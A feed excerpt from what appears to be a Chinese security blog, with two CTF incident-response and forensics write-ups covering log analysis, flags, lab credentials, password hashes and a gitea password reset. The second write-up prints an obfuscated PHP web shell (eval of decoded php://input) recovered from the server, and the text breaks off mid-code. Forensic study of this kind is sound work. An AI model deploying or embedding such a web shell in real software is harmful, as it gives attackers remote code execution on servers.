        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Parloo杯 应急响应附件</span><br><span class="line">请选手提前下载，正式开赛提供解压密码以及文档</span><br><span class="line">文件总大小：70g，请选手下载完成后自行验证 hash 值，确保文件完整性</span><br><span class="line">百度网盘</span><br><span class="line">https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666 提取码: 6666 </span><br><span class="line">夸克网盘</span><br><span class="line">https://pan.quark.cn/s/46653bd06cca</span><br><span class="line">123云盘</span><br><span class="line">https://www.123865.com/s/qDVvjv-zVBod 提取码:6666</span><br></pre></td></tr></table></figure><p>应急响应2-1</p><p>12人已解答</p><p>海底小纵队404notfoundflag签到就完事</p><p>题目描述</p><p>提交堡垒机中留下的flag</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517105145418.png" alt="image-20250517105145418"></p><p>amdin/Skills@2020,标签列表中即是</p><p>应急响应2-2</p><p>题目描述</p><p>提交WAF中隐藏的flag</p><p>分数</p><p>99.5 分</p><p>admin/VF6NXMs7</p><p>应急响应2-3</p><p>11人已解答</p><p>test404notfoundflag0x7c00</p><p>题目描述</p><p>提交Mysql中留下的flag</p><p><a href="http://192.168.20.101:20221/databases/mysql">http://192.168.20.101:20221/databases/mysql</a> </p><p>mysql面板，</p><p>64a44f8137/f8941f8eb7<img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517111325475.png" alt="image-20250517111325475"></p><p>在面版中找了一圈发现没有，果断连上数据库看看</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517111500551.png" alt="image-20250517111500551"></p><p>应急响应2-4</p><p>6人已解答</p><p>404notfoundflagtestctf小分队</p><p>题目描述</p><p>提交攻击者的攻击IP</p><p>分数</p><p>98.52 分</p><p>c394c5de46/e36c392092</p><p>palu{2025-05-07-07-47-41}</p><p>07/May/2025:07:47:40 +0000</p><p>2025-05-07T07:28:26</p><p>palu{2025-5-7-07:28:26}</p><p>palu{2025-05-07-07-28-26}</p><p>2025-05-07T02:35:01</p><p>2025-05-07T07:31:43.059741+00:00 ubuntu sshd[40637]: Failed password for invalid user admin from 192.168.20.108 port 33852 ssh2</p><p>应急响应2-6</p><p>提交web服务泄露的关键文件名</p><p>应急响应2-7</p><p>4人已解答</p><p>404notfoundflag来参加比赛的无非都是在苟延残喘的吗喽罢了test</p><p>题目描述</p><p>题解泄露的邮箱地址</p><p>分数</p><p>99.01 分</p><p>应急响应2-8</p><p>6人已解答</p><p>test来参加比赛的无非都是在苟延残喘的吗喽罢了江州猎手</p><p>题目描述</p><p>提交立足点服务器ip地址</p><p>分数</p><p>98.52 分</p><p>palu{192.168.20.108}</p><p>应急响应2-9</p><p>parloo/parloo</p><p>应急响应2-10</p><p>提交攻击者留下的的文件内容作为flag提交</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517123701812.png" alt="image-20250517123701812"></p><p>palu{hi_2025_parloo_is_hack}</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517124103880.png" alt="image-20250517124103880"></p><p>cat /var/log/secure |grep 172.19.0.3|grep “Failed”</p><p>应急响应2-11</p><p>提交权限维持方法服务的名称</p><p>应急响应2-12</p><p>6人已解答</p><p>来参加比赛的无非都是在苟延残喘的吗喽罢了天下之中二醒醒该搬砖了</p><p>题目描述</p><p>提交攻击者攻击恶意服务器连接地址作为flag提交</p><p>分数</p><p>98.52 分</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517144629463.png" alt="image-20250517144629463"></p><p>192.168.20.103机器有一个aa文件，</p><p>脱下来反编译即可</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517144700508.png" alt="image-20250517144700508"></p><p>应急响应2-13</p><p>找到系统中被劫持的程序程序名作为flag提交</p><p>应急响应2-14</p><p>5人已解答</p><p>404notfoundflag来参加比赛的无非都是在苟延残喘的吗喽罢了0x7c00</p><p>题目描述</p><p>找到系统中存在信息泄露的服务运行端口作为flag提交</p><p>分数</p><p>98.77 分</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517142537978.png" alt="image-20250517142537978"></p><p>8081</p><p>应急响应2-15</p><p>11人已解答</p><p>天下之中二0x7c00云喵</p><p>题目描述</p><p>提交Parloo公司项目经理的身份证号作为flag提交</p><p>分数</p><p>97.32 分</p><p>这里查看网站面板</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517161731618.png" alt="image-20250517161731618"></p><p>可以看到身份证号</p><p><a href="http://192.168.20.103:8081/">http://192.168.20.103:8081/</a></p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517161803924.png" alt="image-20250517161803924"></p><p>网站也能直接查看</p><p>应急响应2-16</p><p>4人已解答</p><p>来参加比赛的无非都是在苟延残喘的吗喽罢了最喜欢可爱的富萝莉了0x7c00</p><p>题目描述</p><p>提交存在危险功能的操作系统路径作为flag提交。flag格式为palu{/xxx/xxx}</p><p>分数</p><p>99.01 分</p><p>这里是危险功能，可以看到，<img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517155401279.png" alt="image-20250517155401279"></p><p>waf中3000端口是有一个git管理器的，从日志中可以看到路径</p><p>/admin/parloo</p><p>为什么能判断恶意呢，我们可以登上git查看</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517155512041.png" alt="image-20250517155512041"></p><p>在20.103的机器中有docker的gitea</p><p>因为没有密码，mysql的hash解不出来，所以只能重置了</p><p>重置的时候会显示没权限么，还是啥，意思就是不能root改密码，我们su git</p><p>在改密码就行了。</p><p>sudo gitea admin user change-password –username <a href="mailto:&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a> –password 12345678</p><p>登上去可以看到go的恶意代码</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517155722389.png" alt="image-20250517155722389"></p><p>应急响应2-17</p><p>提交进源机器中恶意程序的MD5作为flag进行提交。 flag格式为palu{MD5小写}</p><p>应急响应2-18</p><p>题目信息</p><p>Write UP</p><p>17人已解答</p><p>提交攻击者留下的恶意账户名称md5后作为flag进行提交。 格式为palu{md5{xxxxx}}</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529115238121.png" alt="image-20250529115238121"></p><p>palu{md5{hack}}</p><p>应急响应2-19</p><p>22人已解答</p><p>江州猎手404notfoundflag驻场牛马</p><p>题目描述</p><p>提交内部群中留下的flag并提交</p><p>分数</p><p>94.79 分</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517171345253.png" alt="image-20250517171345253"></p><p>palu机器2里有个群聊，直接看即可</p><p>应急响应2-20</p><p>请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</p><p>在waf中可以可看到</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529140841717.png" alt="image-20250529140841717"></p><p>上游地址是<a href="http://192.168.20.103:8080/%EF%BC%8C">http://192.168.20.103:8080/，</a></p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529140928679.png" alt="image-20250529140928679">访问之，里面有路由，</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529140951433.png" alt="image-20250529140951433"></p><p>那么就是他的服务维护界面了。</p><p>在waf中并没有看到相关日志，那就要去其他地方找了。</p><p>在29题中，有一个git源码管理的地方。</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529141307747.png" alt="image-20250529141307747"></p><p>源代码给出了日志文件</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529151410471.png" alt="image-20250529151410471"></p><p>就可以找到相关日志了</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529151550458.png" alt="image-20250529151550458"></p><p>应急响应2-21</p><p>提交获取敏感内容IP的第一次执行命令时间作为flag进行提交。flag格式为palu{xxxx-xx-xx:xx:xx:xx}</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529151709025.png" alt="image-20250529151709025"></p><p>第一条便是了</p><p>应急响应2-22</p><p>提交攻击者使用的恶意ip和端口flag格式为palu{xx.xx.xx.xx:xxxx}</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529151748978.png" alt="image-20250529151748978"></p><p>应急响应2-23</p><p>提交重要数据的明文内容作为flag提交</p><p>在git总有hack的代码</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250529153057549.png" alt="image-20250529153057549"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def custom_encrypt(text, key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [ord(c) for c in key]</span><br><span class="line"></span><br><span class="line">    for i, char in enumerate(text):</span><br><span class="line">        shifted = ord(char) + (i % 5 + 1)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % len(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; 0x0F) &lt;&lt; 4) | ((xored &amp; 0xF0) &gt;&gt; 4)</span><br><span class="line">        encrypted.append(f&quot;&#123;substituted:02x&#125;&quot;)</span><br><span class="line">    return &quot;&quot;.join(encrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但似乎并没有给key</p><p>c3a1c3c13e326020c3919093e1260525045e</p><p>palu3中给了重要数据</p><p>应急响应2-24</p><p>提交恶意维权软件的名称作为flag进行提交</p><p>应急响应2-32</p><p>2人已解答</p><p>test立水桥划水三队虚位以待</p><p>题目描述</p><p>提交攻击者留下的木马md5后作为flag进行提交</p><p>分数</p><p>102.49 分</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517150403071.png" alt="image-20250517150403071"></p><p>应急响应2-36</p><p>13人已解答</p><p>0x7c00404notfoundflagGeek极安云科</p><p>题目描述</p><p>提交恶意用户的数量作为flag进行提交</p><p>分数</p><p>96.85 分</p><p>在palu1 win上有100个</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517165541426.png" alt="image-20250517165541426"></p><p>去掉本身的还有99个</p><p>99</p><p>应急响应2-38</p><p>8人已解答</p><p>0x7c00test404notfoundflag</p><p>题目描述</p><p>提交业务数据中攻击者留下的信息作为flag进行提交</p><p>分数</p><p>98.04 分</p><p>在数据库中有个flag</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517155955071.png" alt="image-20250517155955071"></p><p>应急响应2-39</p><p>3人已解答</p><p>test云喵立水桥划水三队</p><p>题目描述</p><p>提交私人git仓库中留下的内容作为flag进行提交</p><p>分数</p><p>100.25 分</p><p>在仓库中有留下的信息</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517160515087-17474691153161.png" alt="image-20250517160515087"></p><p>base64即可</p><p>应急响应2-40</p><p>8人已解答</p><p>test0x7c00砥柱</p><p>题目描述</p><p>提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</p><p>分数</p><p>98.04 分</p><p>登录mysql服务器，可以看history，</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517163114057.png" alt="image-20250517163114057"></p><p>有个.a这个就是了</p><p>应急响应2-41</p><p>6人已解答</p><p>test0x7c00砥柱</p><p>题目描述</p><p>提交恶意程序中模拟c2通信的函数名称作为flag进行提交</p><p>分数</p><p>98.52 分</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517164527582.png" alt="image-20250517164527582"></p><p>把.a放ida里，可以看到相关操作</p><p>simulate_network_communication</p><p>应急响应2-42</p><p>6人已解答</p><p>test0x7c00砥柱</p><p>题目描述</p><p>提交恶意程序创建隐藏文件的名称作为flag提交</p><p>分数</p><p>98.52 分</p><p>查看.a  里面创建了隐藏文件，</p><p><img src="D:\myBlog\images\第二届ParlooCTF应急响应挑战赛部分wp\image-20250517163705840.png" alt="image-20250517163705840"></p><p>就是这个了，</p><p>应急响应2-43</p><p>5人已解答</p><p>0x7c00砥柱Geek极安云科</p><p>题目描述</p><p>提交恶意程序中模拟权限提升的函数作为flag进行提交</p><p>分数</p><p>98.77 分</p><p>如上</p><p>simulate_privilege_escalation</p><p>sudo gitea admin user change-password –username <a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#x61;&#x64;&#109;&#x69;&#x6e;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a> –password 123456</p><p>admin        <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>    0    enabled    8231accbd6c278c47f9863b6e4e119f8c6994372e513c32ad89cb98f1b193b4e1425029b61e495bdfd11b20ccec3555642a5    pbkdf2$50000$50    0    0    0        0            029a5e0a032aa4c25cd66fbbc5c117de    b171d280fe6055840eb8153178a81cbc    zh-CN        1746368544    1747159639    1747159579    1    -1    1    1    0    0    0    1    0    34be3c7c0655313619d9b91a7e6f1ee6<br>hack        <a href="mailto:&#104;&#x61;&#99;&#107;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#104;&#x61;&#99;&#107;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a>    0    enabled    bfd762fa77fbe2cb55c81878fa343ed754464cf59a98d79e3baaea62d17f67ed57bb3404d2400f0c045d93588fc6f81ede73    pbkdf2$50000$50    0    0    0        0            cbbb72e134480ea1a2fd43cae954a282    6b887cf34c01f71b9c656a1c42d3c5cb    zh-CN        1747075693    1747075741    1747075693    1    -1    1    0    0    0    0    1    0    ca467a243edddda808379cd157864068<br>1        @qq.com    0    enabled    palu{crP1ZIVfqrkfdhGy}    argon2    0    0    0        0            aaaaaaaaaaaaaaa    aaaaaaaaaaaaaaa    zh-CN        1747075693    1747075693    1747075693    1    -1    1    0    0    0    0    1    0    aaaaaaaaaaaa</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第四届&quot;长城杯&quot;信息安全铁人三项赛总决赛wp-溯源取证wp</title>
      <link href="/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/"/>
      <url>/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<h3 id="前面"><a href="#前面" class="headerlink" title="前面"></a>前面</h3><p>溯源取证本来以为是wireshark包的，没想到这次都是日志包，总共有两个日志包，一个是详细的，一个是不详细的。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>1，黑客攻击服务器时使用的内网ip为多少</p><p>2，黑客嗦进行的目录扫描一共有多少条</p><p>3，黑客进行账号密码爆破的次数</p><p>下面几个没有截图，不过记住大概了</p><p>4，黑客登录时使用的账号密码为多少，格式账号、密码</p><p>5，黑客添加的email地址为多少</p><p>6，黑客第一次上传木马的绝对路径为多少，该木马未被使用</p><p>下面是没有做出来的了，本篇文章将仔细分析</p><p>7，黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开</p><p>8，9，10就不太清楚了，肯定是一些利用木马所操作的内容了，赛后问其他大师傅，有反弹shell的ip，port啥的，因为后面利用木马的次数比较少，我们都分析一下。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这里没有把整个网站目录打包，只把重要日志留了下来，</p><p>有需要的师傅可以下载一下。</p><p><a href="/images/tiesan/t3.7z">流量包下载</a></p><h4 id="1黑客攻击服务器时使用的内网ip为多少"><a href="#1黑客攻击服务器时使用的内网ip为多少" class="headerlink" title="1黑客攻击服务器时使用的内网ip为多少"></a>1黑客攻击服务器时使用的内网ip为多少</h4><p>在比赛现场，web的网站在/var/www/html/下</p><p>web日志在/var/log/httpd/下，有很多日志文件,这里复习原因，我们先把日志拖到自己的服务器上</p><p><img src="/images/tiesan/image-20230505140424354.png" alt="image-20230505140424354"></p><p>第一个很简单，因为如果cat的话，太长了，我们使用head 查看前几个就行，</p><p>``head -n 10 access_log-20230426`</p><p><img src="/images/tiesan/image-20230505140539840.png" alt="image-20230505140539840"></p><p>可以看到192.168.12.140对服务器进行了请求，user-agent为“Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0”，可以看到是正常的请求，接着<code> head -n 100 access_log-20230426</code>看100条日志时，</p><p><img src="/images/tiesan/image-20230505141009132.png" alt="image-20230505141009132"></p><p>就可以看到基本都是404 且user-agent为”Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”这种user-agent一般都不是正常机器了，所以我们判断攻击ip为<code>192.168.12.140</code></p><p>flag:192.168.12.140</p><p><img src="/images/tiesan/image-20230505141302281.png" alt="image-20230505141302281"></p><h4 id="2黑客所进行的目录扫描一共有多少条"><a href="#2黑客所进行的目录扫描一共有多少条" class="headerlink" title="2黑客所进行的目录扫描一共有多少条"></a>2黑客所进行的目录扫描一共有多少条</h4><p>这里一条一条的数肯定不现实，可以grep进行匹配，然后wc进行计数，匹配话，我们进行user-agent匹配，上面已经看到很多404的user-agent为”Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”,我们使用命令</p><p><code> cat access_log-20230426 | grep &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&quot; | wc -l</code></p><p><img src="/images/tiesan/image-20230505141553056.png" alt="image-20230505141553056"></p><p>即可得出答案</p><p>flag 55510</p><p><img src="/images/tiesan/image-20230505141628382.png" alt="image-20230505141628382"></p><h4 id="3黑客进行账号密码爆破的次数"><a href="#3黑客进行账号密码爆破的次数" class="headerlink" title="3黑客进行账号密码爆破的次数"></a>3黑客进行账号密码爆破的次数</h4><p>这里爆破次数，因为当时比赛环境宕机了，它现场那个web，vnc总是404，裁判那边把服务器账号密码都给了，ssh能连接，所以就把日志下载下来了，日志太大记事本不行，几万行和几百万行的数据，在做的时候，用一些其他编辑器打开的时候，会匹配不到各种字符，最后用vscode匹配，很流畅且丝滑。</p><p>登录的话，一般都是会有login 登录关键词，我们直接匹配login，<code>cat access_log-20230426 | grep &quot;login&quot;</code></p><p><img src="/images/tiesan/image-20230505142323914.png" alt="image-20230505142323914"></p><p><img src="/images/tiesan/image-20230505142400480.png" alt="image-20230505142400480"></p><p>可以看到，有爆破的痕迹，因为在上面爆破目录的时候，也会存在login，所以为我们可以匹配“/index.php?c=access&amp;a=login”这个，这样就少一点</p><p><code> cat access_log-20230426 | grep &quot;index.php?c=access&amp;a=login&quot;</code></p><p><img src="/images/tiesan/image-20230505142936437.png" alt="image-20230505142936437"></p><p>这样匹配下来，可以看到有很多有get和post形式的，最重要可以看到前面几条为正常请求，那么我们直接匹配这个hydra的爆破”Mozilla/5.0 (Hydra)”</p><p>root@Bohemian:/tools/tiesan# cat access_log-20230426 | grep “Mozilla/5.0 (Hydra)” | wc -l</p><p><img src="/images/tiesan/image-20230505143241531.png" alt="image-20230505143241531"></p><p>可以看到是这么多条，但是其中也包含了get请求的，hydra在爆破网页的同时会先请求一下是否存在，那就要去掉GET</p><p>直接在匹配<code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (Hydra)&quot; |grep &quot;POST /index.php?c=access&amp;a=login HTTP/1.0&quot; |wc -l</code></p><p><img src="/images/tiesan/image-20230505143558618.png" alt="image-20230505143558618"></p><p>flag 2051</p><p><img src="/images/tiesan/image-20230505143616122.png" alt="image-20230505143616122"></p><h4 id="4黑客登录成功所用的账号密码"><a href="#4黑客登录成功所用的账号密码" class="headerlink" title="4黑客登录成功所用的账号密码"></a>4黑客登录成功所用的账号密码</h4><p>这里账号密码爆破，肯定不在这个access的日志中了，会有一个详细日志包，就是 modsec_audit.log-20230426</p><p>4.26的日志包</p><p><img src="/images/tiesan/image-20230505143833110.png" alt="image-20230505143833110"></p><p>我们再次回到上面匹配登录哪里，可以看到，hydra爆破时，最后有一个登录的302状态码，说明登录成功，时间为“ [04/Dec/2019:16:22:34 +0800] ”，我们直接去详细日志中搜索，当然也可以在linux匹配，但是不建议，因为他都是匹配一行，有点麻烦，直接搜16:22:34</p><p><img src="/images/tiesan/image-20230505144150344.png" alt="image-20230505144150344"></p><p>就可以看到账号密码了，login%5Busername%5D=admin&amp;login%5Bpassword%5D=p455w0rd&amp;configOptionSelect=Default</p><p>账号为admin</p><p>密码为p455w0rd</p><p>flag admin/p455w0rd</p><h4 id="5黑客添加的email地址为多少"><a href="#5黑客添加的email地址为多少" class="headerlink" title="5黑客添加的email地址为多少"></a>5黑客添加的email地址为多少</h4><p>一般来说，email地址一般都有关键字为mail，然后添加地址肯定是黑客所为，这里他的user-agent我们可以从上面知道”Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0”，我们匹配这个之后在匹配一下mail<code> cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot; | grep &quot;mail&quot;</code></p><p><img src="/images/tiesan/image-20230505145108428.png" alt="image-20230505145108428"></p><p>仔细看，这里有一个可疑邮箱，为<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#122;&#x7a;&#46;&#99;&#111;&#x6d;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#122;&#x7a;&#46;&#99;&#111;&#x6d;</a>，可以提交试试，这里再仔细分析，去搜索这个邮箱</p><p><img src="/images/tiesan/image-20230505145238135.png" alt="image-20230505145238135"></p><p>这里因为在web页面@会url编码，我们就直接搜zz.com一样的，发现三个，</p><p><img src="/images/tiesan/image-20230505145615436.png" alt="image-20230505145615436"></p><p>其中在包含2495280这一行的这个数据包为POST传参，所以判定为添加的email</p><p>flag <a href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x7a;&#x7a;&#46;&#x63;&#111;&#x6d;">&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x7a;&#x7a;&#46;&#x63;&#111;&#x6d;</a></p><h4 id="6黑客第一次上传木马的绝对路径为多少，该木马未被使用"><a href="#6黑客第一次上传木马的绝对路径为多少，该木马未被使用" class="headerlink" title="6黑客第一次上传木马的绝对路径为多少，该木马未被使用"></a>6黑客第一次上传木马的绝对路径为多少，该木马未被使用</h4><p><code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</code></p><p>继续使用这个命令去看黑客的操作，在最后面可以看到</p><p><img src="/images/tiesan/image-20230505150207488.png" alt="image-20230505150207488"></p><p>有个1.php，这个1.php在请求时，为404，所以不是这个文件，upload后面的也不是，接着往下，有一个upload/055这里，匹配一下，</p><p><img src="/images/tiesan/image-20230505150429344.png" alt="image-20230505150429344"></p><p>可以看到有类似的操作，我们到详细日志包中嗦一下,如果要是利用这个木马，那肯定需要POST提交，搜索<code>POST /upload/055</code></p><p><img src="/images/tiesan/image-20230505151035079.png" alt="image-20230505151035079"></p><p>发现有两条，估计时连接时的请求，应该是没有利用</p><p>其路径为“/upload/055/741/33e/896eee6d3709e7ff535b01986e7de1a”</p><p>不带那个文件名</p><p>flag <code>/var/www/html//upload/055/741/33e/</code></p><p>下面的就是没有做出来的了</p><h4 id="7黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开"><a href="#7黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开" class="headerlink" title="7黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开"></a>7黑客上传的木马方式为什么，木马密码为什么，大写字母，用空格分开</h4><p>最开始以为，这个上传木马的方式为漏洞方式呢，比如反序列化，啥的，最后发现为http请求方式。</p><p><img src="/images/tiesan/image-20230505151815232.png" alt="image-20230505151815232"></p><p>在详细包中，可以看到最后请求了111.php，但是上面似乎并没有出现111.php，回到access包，对这个木马前面的POST请求进行会找时，也没有发现什么</p><p><img src="/images/tiesan/image-20230505152320785.png" alt="image-20230505152320785"></p><p>往下可以看到一个111.php 被POST利用，可以看到时curl的，是PUT传参方式了</p><p><img src="/images/tiesan/image-20230505152435124.png" alt="image-20230505152435124"></p><p>接下来，开始研究这个木马</p><p>这个111.php是在，服务器中的，我们可以直接查看的，现场的时候，把他下载下来了，内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crkAeatkAekA_fkAkAunkAction&#x27;</span>);</span><br><span class="line"><span class="variable">$F</span>=<span class="string">&#x27;;$j++,$i++!)!!&#123;$o.=$t&#123;$i&#125;^$k&#123;$!j&#125;;!&#125;&#125;!return !$o;&#125;if (@pr!eg!!_&#x27;</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="string">&#x27;r=@b!ase65_en!code(!@x(@gzc!ompres!s($o),$k!));pri!nt!(&quot;$p$k!h$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$S</span>=<span class="string">&#x27;match(&quot;/$kh(.+)$!!kf/&quot;,@file!_get_!cont!ents!(&quot;php://in!put&quot;),$!&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;m)=!=2) &#123;@ob_star!t()!;@e!val!(@gz!uncompress(@x(@ba!se64!_deco!d&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;e($m![2!]),$k)));!$o=@ob_get!_co!ntents(!);@ob_end!_clean!();$!&#x27;</span>;</span><br><span class="line"><span class="variable">$I</span>=<span class="string">&#x27;!!$k=&quot;bd377!f!17&quot;;!$kh=&quot;9d4!cd50b4843&quot;;$kf=&quot;5b!d9ce82!0!932&quot;;$p&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;!len($t);$o=!&quot;&quot;;f!o!r($i=1;!$!i&lt;$l;)&#123;for($j=0;(!$j&lt;$c!!&amp;&amp;$i&lt;$!l)&#x27;</span>;</span><br><span class="line"><span class="variable">$J</span>=str_replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$I</span>.<span class="variable">$b</span>.<span class="variable">$H</span>.<span class="variable">$F</span>.<span class="variable">$S</span>.<span class="variable">$s</span>.<span class="variable">$e</span>.<span class="variable">$n</span>);</span><br><span class="line"><span class="variable">$V</span>=<span class="variable">$u</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$J</span>);<span class="variable">$V</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ----------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;=&quot;oO!tvN!y5TkuOg1fjf!&quot;;func!t!ion x($t,$k!)&#123;$c=str!len($k!);$l=s!tr&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span>=str_replace(<span class="string">&#x27;kA&#x27;</span>,<span 